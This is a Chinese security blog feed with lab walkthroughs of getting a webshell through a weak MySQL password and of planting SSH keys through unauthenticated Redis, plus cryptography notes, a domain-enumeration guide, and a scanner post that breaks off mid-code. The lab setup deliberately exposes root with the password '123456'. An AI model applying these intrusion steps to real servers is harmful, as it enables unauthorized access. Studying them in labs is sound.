    <title>通过mysql弱密码获取webshell</title>
    <link href="/2018/01/21/%E9%80%9A%E8%BF%87mysql%E5%BC%B1%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96webshell/"/>
    <url>/2018/01/21/%E9%80%9A%E8%BF%87mysql%E5%BC%B1%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96webshell/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-mysql"><a href="#0x00-mysql" class="headerlink" title="0x00 mysql"></a>0x00 mysql</h2><p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的关系数据库管理系统应用软件。<br>MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。<br>MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。  </p><h2 id="0x01-mysql弱密码漏洞"><a href="#0x01-mysql弱密码漏洞" class="headerlink" title="0x01 mysql弱密码漏洞"></a>0x01 mysql弱密码漏洞</h2><p>本地mysql安全配置不当，导致不经ip过滤可以进行远程登陆，并且密码设置太过简单，使其他人可以通过mysql访问数据库并且进行读写操作。  </p><h2 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h2><p>被拿到webshell会丢失网站的权限，入侵者就可以随意修改删除这个网站的内容。  </p><h2 id="0x03-靶机环境配置"><a href="#0x03-靶机环境配置" class="headerlink" title="0x03 靶机环境配置"></a>0x03 靶机环境配置</h2><p>安装配置mysql  </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">sudo yum install -y mysql mysql-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>安装配置apache  </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y httpd<br></code></pre></td></tr></table></figure><p>安装配置php  </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y php<br></code></pre></td></tr></table></figure><p>安装php的一些组件</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y php-mysql php-gd libjpeg* php-imap php-ldap php-odbc php-pear php-mysqlnd<br></code></pre></td></tr></table></figure><p>安装完成后编辑配置文件，然后重启httpd和mariadb，并且在/var/www/html目录创建index.php<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql1.png"><br>在index.php写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>然后浏览localhost查看组件是否安装完善  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql2.png"><br>然后在index.php写入下面内容  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost:3306&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . mysqli_error());<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接成功！&#x27;</span>;<br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看数据库是否连接成功<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql3.png"><br>然后设置mysql的安全配置  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/my</span>.cnf<br></code></pre></td></tr></table></figure><p>首先将bind-address注释掉<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql4.png"><br>然后本地进入mysql，更改权限使root用户从任意ip都可以访问<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql5.png"><br>查看权限发现可以通过任意地址访问<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql6.png">  </p><h2 id="0x04-主机环境配置"><a href="#0x04-主机环境配置" class="headerlink" title="0x04 主机环境配置"></a>0x04 主机环境配置</h2><p>安装hydra</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y hydra<br></code></pre></td></tr></table></figure><p>安装mysql</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y mysql<br></code></pre></td></tr></table></figure><h2 id="0x05-测试"><a href="#0x05-测试" class="headerlink" title="0x05 测试"></a>0x05 测试</h2><p>过程:使用hydra进行mysql的弱密码攻击并尝试利用mysql写入webshell，从而利用<br>webshell进行进一步攻击。  </p><p>通过主机对靶机进行爆破，发现root的密码是123456<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql7.png"><br>通过mysql连接靶机：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql8.png"><br>构造并写入webshell：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql9.png"><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql10.png">   </p><p>编辑菜刀连接一句话木马:<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql15.png"><br>连接成功，获得网站目录内读写权限:<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql16.png">  </p><h2 id="0x06-进行使用openvas对该存在漏洞的系统扫描"><a href="#0x06-进行使用openvas对该存在漏洞的系统扫描" class="headerlink" title="0x06 进行使用openvas对该存在漏洞的系统扫描"></a>0x06 进行使用openvas对该存在漏洞的系统扫描</h2><p>扫描结果:  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql13.png"><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/mysql/mysql14.png">  </p><h2 id="0x07-应对方案"><a href="#0x07-应对方案" class="headerlink" title="0x07 应对方案"></a>0x07 应对方案</h2><ul><li>加强mysql密码强度</li><li>尽量不要将mysql权限赋予公网</li><li>定期检查网站内有没有木马</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>php</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis未授权访问漏洞</title>
    <link href="/2018/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-redis"><a href="#0x00-redis" class="headerlink" title="0x00 redis"></a>0x00 redis</h2><p>Redis 是一个高性能的key-value数据库。它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。<br>在此基础上，redis支持各种不同方式的排序。为了保证效率，数据都是缓存在内存中。redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave同步。  </p><h2 id="0x01-redis未授权访问"><a href="#0x01-redis未授权访问" class="headerlink" title="0x01 redis未授权访问"></a>0x01 redis未授权访问</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。  </p><h2 id="0x02-redis未授权访问漏洞产生的原因"><a href="#0x02-redis未授权访问漏洞产生的原因" class="headerlink" title="0x02 redis未授权访问漏洞产生的原因"></a>0x02 redis未授权访问漏洞产生的原因</h2><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。  </p><h2 id="0x03-漏洞重现和利用"><a href="#0x03-漏洞重现和利用" class="headerlink" title="0x03 漏洞重现和利用"></a>0x03 漏洞重现和利用</h2><p>首先在靶机安装redis并且不设置密码  </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> redis* -y<br></code></pre></td></tr></table></figure><p>在靶机安装ssh服务</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> openssh<br></code></pre></td></tr></table></figure><p>在靶机配置redis配置文件，注释掉ip限制，并且设置安全设置为no，使其可以在公网被访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>redis.conf<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis1.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis2.png">  </p><p>重启redis服务<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis3.png"><br>测试是否在公网开启<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis4.png"><br>在靶机打开ssh服务<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis5.png"><br>在主机本地生成ssh公钥<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis6.png"><br>连接靶机redis服务，并利用redis未授权访问漏洞在目标服务器/root/.ssh文件夹的authotrized_keys写入刚才创建的ssh公钥<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis7.png"><br>利用本机的ssh私钥登陆靶机服务器<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis8.png">  </p><h2 id="0x04-使用openvas对该存在漏洞的系统进行扫描"><a href="#0x04-使用openvas对该存在漏洞的系统进行扫描" class="headerlink" title="0x04 使用openvas对该存在漏洞的系统进行扫描"></a>0x04 使用openvas对该存在漏洞的系统进行扫描</h2><p>通过openvas扫描靶机系统，可以得到以下结果：  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis9.png"><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/redis/redis10.png"></p><h2 id="0x05-危害"><a href="#0x05-危害" class="headerlink" title="0x05 危害"></a>0x05 危害</h2><ul><li>数据库数据泄露<br>Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。</li><li>代码执行<br>Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行<br>一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的。<br>通过Lua代码攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。</li><li>敏感信息泄露<br>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。  </li></ul><h2 id="0x06-应对方案"><a href="#0x06-应对方案" class="headerlink" title="0x06 应对方案"></a>0x06 应对方案</h2><p>Redis未授权访问漏洞是一个出现广泛并且危害巨大的漏洞，会直接导致整个服务器沦陷，要预防则需要做到：</p><ul><li>（1）禁止使用 root 权限启动 redis 服务；</li><li>（2）对 redis 访问启用密码认证，尤其不能使用空密码；</li><li>（3）添加 IP 访问限制；</li><li>（4）尽可能不对公网直接开放 SSH 服务。</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学(二)——古典密码(下)</title>
    <link href="/2017/12/27/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%BA%8C-%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-%E4%B8%8B/"/>
    <url>/2017/12/27/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%BA%8C-%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-%E4%B8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-信息加密原理"><a href="#0x00-信息加密原理" class="headerlink" title="0x00 信息加密原理"></a>0x00 信息加密原理</h2><p>信息加密是保证数据安全的一种方式。<br>信息加密的原理是：把明文用加密方法和密钥生成保密的密文，只有使用正确的解密方法和密钥后才能还原出明文。<br>一个完善的密码体制至少应该满足两个条件：  </p><ul><li>1.已知明文和加密密钥时，容易算出密文和解密过程。</li><li>2.未知解密密钥时，难以由密文推出明文。  </li></ul><p>这里介绍以下三种古典密码的加密方式:  </p><ul><li>Vernam密码</li><li>Hill密码</li><li>Enigma密码</li></ul><h2 id="0x01-Vernam密码"><a href="#0x01-Vernam密码" class="headerlink" title="0x01 Vernam密码"></a>0x01 Vernam密码</h2><p>弗纳姆密码相比前面几种古典密码，不同处在于对其对应位的二进制数字进行异或操作，可以简单的表示为：   </p><p>密文（2进制）=明文（2进制） ⊕ 密钥（2进制）  </p><p>相反，解密过程就成了：  </p><p>明文（2进制）=密文（2进制） ⊕ 密钥（2进制）  </p><p>Vernam密码的核心就是密钥构造的方法，可以使用很长的密钥。虽然长密钥会使得密钥分析变的很困难，但是在大量样本的情况下，使用已知的部分明文序列，对破译帮助很大。</p><p>而Vernam密码的改进方案则是号称永不可破译的“一次一密”，因为其密文与明文没有任何的统计关系，使穷举法破译过程永远无法停止，但是这种方法有个额外的困难，那就是密钥要在发送者和接收者之间传递，保存并保护，传递过程很容易出现问题，所以“一次一密”很少被使用。</p><h2 id="0x02-Hill密码"><a href="#0x02-Hill密码" class="headerlink" title="0x02 Hill密码"></a>0x02 Hill密码</h2><p>希尔密码是一种多字母加密方法，其原理是矩阵的线性变换。<br>Hill密码算法取m个连续的明文字母，并用m个密文字母代替。这种替代由m个线性方程决定，其中每个字符被分配一个数值（a-z对应0-25）。<br>如m=3，可以用方程描述如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/04.png"><br>用向量可以表示为：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/05.png"><br>即C=K·P，其中C是密文，P是明文，K是一个密钥矩阵，K·P计算完成后进行模26运算，即可得到密文的对应数值矩阵，然后再转换为密文字母即可。  </p><p>解密时，只需要求密钥矩阵K的逆矩阵K’，然后P=K·C计算完成后取模26运算，即可得到明文对应数值的矩阵，再转换为明文字母即可。  </p><p>Hill密码的优点在于能完全隐藏单字母的统计频率，3×3的Hill密码还隐藏了两个字母的频率信息，如果矩阵维度更大，则可以隐藏更多的频率信息。<br>但是Hill密码的缺点在于，如果同时知道明文和密文，攻破难度就会大大降低。</p><h2 id="0x03-Enigma密码"><a href="#0x03-Enigma密码" class="headerlink" title="0x03 Enigma密码"></a>0x03 Enigma密码</h2><p>Enigma密码又称为转子机密码，Enigma加密和解密需要一台类似打字机的设备，设定初始位置之后，通过输入明文，设备经过加密输出密文。解密时通过机械装置的切换，实现逆过程解密操作，输入密文，输出明文。<br>Enigma加密设备由一系列独立转动的圆柱体组成。每个圆柱体有26个输入引脚和26个输出引脚，其内部连线将每个输入引脚连接到一个相应的输出引脚。<br>如一个圆柱体的机器，每次输入一个明文字母，输出一个对应的密文字母，然后圆柱体旋转一格位置，然后再输入一个同样的明文字母的时候，因为之前的位置已经改变，所以密文字母也会不同，这就定义了一个不同的单字母替代密码。当连续输入26个字母之后，圆柱体又回到了原来的位置，这个时候我们就得到了以26为周期的多字母替代算法。<br>一个圆柱体看上去很简单，但是当增加圆柱体的数量，我们就可以得到更复杂的多字母替代算法：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/06.jpg"><br>如三个圆柱体分别为快速转子，中速转子和慢速转子：</p><ul><li>每输入一个明文字母，快速转子动一格</li><li>快速转子转动够一周，中速转子转动一格</li><li>中速转子转动够一周，慢速转子转动一格<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/07.jpg"><br>这样我们就可以得到26×26×26种不同的替代字母，密码强度就会大大提高。</li></ul>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学(一)——古典密码(上)</title>
    <link href="/2017/12/22/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%B8%80-%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-%E4%B8%8A/"/>
    <url>/2017/12/22/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%B8%80-%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-%E4%B8%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-信息加密原理"><a href="#0x00-信息加密原理" class="headerlink" title="0x00 信息加密原理"></a>0x00 信息加密原理</h2><p>信息加密是保证数据安全的一种方式。<br>信息加密的原理是：把明文用加密方法和密钥生成保密的密文，只有使用正确的解密方法和密钥后才能还原出明文。<br>一个完善的密码体制至少应该满足两个条件：  </p><ul><li>1.已知明文和加密密钥时，容易算出密文和解密过程。</li><li>2.未知解密密钥时，难以由密文推出明文。  </li></ul><p>这里介绍几种古典密码的加密方式:  </p><h2 id="0x01-Greece密码"><a href="#0x01-Greece密码" class="headerlink" title="0x01 Greece密码"></a>0x01 Greece密码</h2><p>希腊密码出现于公元前2世纪，是一种二维字母表编码方法(字母i和j算一个字母)。<br>如图将26个字母分为5×5的矩阵，用行列号作为字母的编码。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/01.png"><br>如上图，GREECE可以编码为22 42 15 15 13 15<br>因为几乎是一一对应的关系，通过统计的方法可以很轻松的得出规律。  </p><h2 id="0x02-Caesar密码"><a href="#0x02-Caesar密码" class="headerlink" title="0x02 Caesar密码"></a>0x02 Caesar密码</h2><p>凯撒密码是一种古老的单表置换密码。方法是把字母表种每个字母用后面第n个字母进行替换。<br>如n=5：</p><ul><li>字母表为：abcdefghijklmnopqrstuvwxyz</li><li>置换表为：fghijklmnopqrstuvwxyzabcde</li></ul><p>如caesar可以编码为hfjxfw<br>但是我们显然可以看到凯撒密码暴力破解最多只需要25次穷举就可以看到所有结果，是非常不安全的。  </p><h2 id="0x03-Prefix密码"><a href="#0x03-Prefix密码" class="headerlink" title="0x03 Prefix密码"></a>0x03 Prefix密码</h2><p>标准字头密码又称为密钥短语密码，属于单表置换密码，与凯撒密码类似，但利用一个标准密钥字来做表头，构造变换表。密钥字通常是单词或者词组，便于记忆。<br>如密钥字 K = big，则变换规则如下：</p><ul><li>字母表为：abcdefghijklmnopqrstuvwxyz</li><li>置换表为：bigacdefhjklmnopqrstuvwxyz  </li></ul><p>我们可以看到，big三个字母被放在了表头，然后剩下的字母依次排布。<br>如link的编码是lhnk，可以看到，这种方式如果选择的关键字太少且位于太前，后面的字母本身就对应明文，所以安全性也是很差的。并且所有的字母一一对应的加密方式，都可以用统计的方法破解。</p><h2 id="0x04-Playfair密码"><a href="#0x04-Playfair密码" class="headerlink" title="0x04 Playfair密码"></a>0x04 Playfair密码</h2><p>公平竞赛密码属于多表加密体制，将明文中的双字母组合作为一个单元对待，并将这些单元转换为密文双字母组合。<br>Playfair算法使用一个5×5字母矩阵，该矩阵使用一个关键词构造。<br>例如关键词是big，那么排布规则和Prefix密码一致，只是要按照从左到右，从上到下的顺序把变换表写出来：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/02.png"><br>生成矩阵之后，根据以下规则依次对明文的两个字母加密。  </p><ul><li>1.属于相同对中的重复明文字母将使用一个填充字母进行分隔。</li><li>2.属于矩阵同行的明文字母将由其右边的字母代替，而行的最后一个字母由行的第一个字母代替。</li><li>3.属于矩阵同列的明文字母将由它下面的字母代替，而列的最后一个字母由列的第一个字母代替。</li><li>4.明文的其他字母将由与其同行，其与下一个字母同列的字母代替。（也可以理解成以两个明文字母为顶角画矩形，矩形的另一对顶角即为密文字母对）  </li></ul><p>Playfair密码比起单字母替换的优势在于，26个字母衍生出26×26=676种双字母组合，频率分布也不规则，使分析起来要难很多。所以一战中被英国陆军作为顶级加密系统，二战中也被同盟国大量使用。</p><h2 id="0x05-Vigenere密码"><a href="#0x05-Vigenere密码" class="headerlink" title="0x05 Vigenere密码"></a>0x05 Vigenere密码</h2><p>维吉尼亚密码是一种简单的单字符多表替换密码。其加密方法是：<br>为了加密一个消息，需要一个与该消息长度一致的密钥。通常该密钥为一重复的关键词。<br>如我们事先构造一个维吉尼亚矩阵，由步长为0到25的26行凯撒密码构成。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/03.png"><br>如图我们给定密钥字母d和明文字母w，密文字母就位于（d,w）位置。<br>如我们给出密钥关键字是fun，明文是exciting，则：</p><ul><li>密钥为：funfunfu</li><li>明文为：exciting</li><li>密文为：jrpnnvsa</li></ul><p>解密方法则是以密钥字母标识行，密文字母标识列，明文字母位于该列首部。<br>Vigenere密码的强度在于每个明文字母由多个密文字母对应，字母的频率信息变得模糊了，但是并不是所有明文得出的频率信息都丢失了，比起Playfair更优，但是还是会保留大量的频率信息。  </p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域名收集</title>
    <link href="/2017/12/17/%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/"/>
    <url>/2017/12/17/%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>信息收集上的花费要占到一次渗透测试很大的比例，域名收集则是信息收集重要的一环。 </p><h2 id="0x00-常用域名收集方法一览"><a href="#0x00-常用域名收集方法一览" class="headerlink" title="0x00 常用域名收集方法一览"></a>0x00 常用域名收集方法一览</h2><ul><li>搜索引擎</li><li>github</li><li>fierce</li><li>dnsenum</li></ul><h2 id="0x01-搜索引擎"><a href="#0x01-搜索引擎" class="headerlink" title="0x01 搜索引擎"></a>0x01 搜索引擎</h2><p>搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。<br>我们在进行域名收集时，借助搜索引擎是方便的一种方式，收集方式与一般访问无异，收集之后不会被目的服务器的安全策略记录为异常，但是收集完善性有限。如果目标网站有robot.txt中对搜索引擎的限制，则无法收集，不过我们可以通过访问其robot.txt，然后手动进行扫描或者写脚本进行扫描。<br>如我们收集西电相关的域名site:xidian.edu.cn<br>如图我们使用google搜索引擎和yandex搜索引擎进行收集：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/01.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/02.jpg"></p><h2 id="0x02-github"><a href="#0x02-github" class="headerlink" title="0x02 github"></a>0x02 github</h2><p>gitHub是一个面向开源及私有软件项目的托管平台，功能十分强大，绝大多数开发人员都会使用。<br>在github的搜索框中键入目标官方域名，就可以得到很多相关项目，代码，网站等搜索结果。<br>如输入 xidian.edu.cn,在code选项卡可以看到很多结果：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/03.png"></p><h2 id="0x03-fierce"><a href="#0x03-fierce" class="headerlink" title="0x03 fierce"></a>0x03 fierce</h2><p>fierce是一个域名扫描综合性工具。它可以快速获取指定域名的DNS服务器，并检查是否存在区域传输（Zone Transfer）漏洞。如果不存在该漏洞，会自动执行暴力破解，以获取子域名信息。对获取的IP地址，它还会遍历周边IP地址，以获取更多的信息。最后，还会将IP地址进行分段统计，以便于后期其他工具扫描，如NMAP。<br>这里用西工大的官网进行测试<br>使用方法：</p><ul><li>基本扫描<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/04.png"></li><li>指明需要搜索的子域名<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/05.png"></li><li>在域名周围的连续快中遍历<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/06.png"></li><li>还有很多方法，我们可以在帮助文件中自行尝试<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/07.png"></li></ul><h2 id="0x04-dnsenum"><a href="#0x04-dnsenum" class="headerlink" title="0x04 dnsenum"></a>0x04 dnsenum</h2><p>DNSenum是一款非常强大的 域名信息收集工具，目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。<br>同样用西工大的域名作为测试对象<br>使用方法：  </p><ul><li>基本使用<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/08.png"></li><li>根据字典文件遍历子域名<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/09.png"></li><li>保存扫描结果<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/10.png">  </li></ul><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>域名收集的方式还有很多，比如利用DNS反相解析来收集域名，利用DNS Transfer来收集域名，利用zap来被动感知域名等等。<br>收集途径很多但没有什么优劣之分，在我们进行域名收集时，要根据自己的实际需求来做出恰当的选择。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于python的网站后台扫描器</title>
    <link href="/2017/12/12/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <url>/2017/12/12/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>最近没什么事情干，就把之前自己写的python工具写到博客里面  </p><h2 id="0x00-需要用到的库"><a href="#0x00-需要用到的库" class="headerlink" title="0x00 需要用到的库"></a>0x00 需要用到的库</h2><ul><li>requests： requests 是用Python语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。</li><li>threading： 多线程的库，跟网页交互如果单线程会等很多时间。</li><li>time： 统计运行时间的时候要用到。  </li></ul><h2 id="0x01-程序设计思路"><a href="#0x01-程序设计思路" class="headerlink" title="0x01 程序设计思路"></a>0x01 程序设计思路</h2><p>我们需要从字典文件中读入有可能的路径，然后循环访问，遇到返回状态码200代表可以访问，遇到其他的状态码代表不能访问。  </p><h2 id="0x02-单线程实现"><a href="#0x02-单线程实现" class="headerlink" title="0x02 单线程实现"></a>0x02 单线程实现</h2><pre><code class="python">import requestsdef guesshtml(url_list,real_list):    for url in url_list:        r = requests.get(url, timeout=30)        if r.status_code==200:            print(&quot;存在: &quot;+url)            real_list.append(url)        else:            print(&quot;不存在: %s 错误代码: %d&quot;% (url,r.status_code))    return real_listdef add_url(html,dic,url_list):    for line in dic:        line 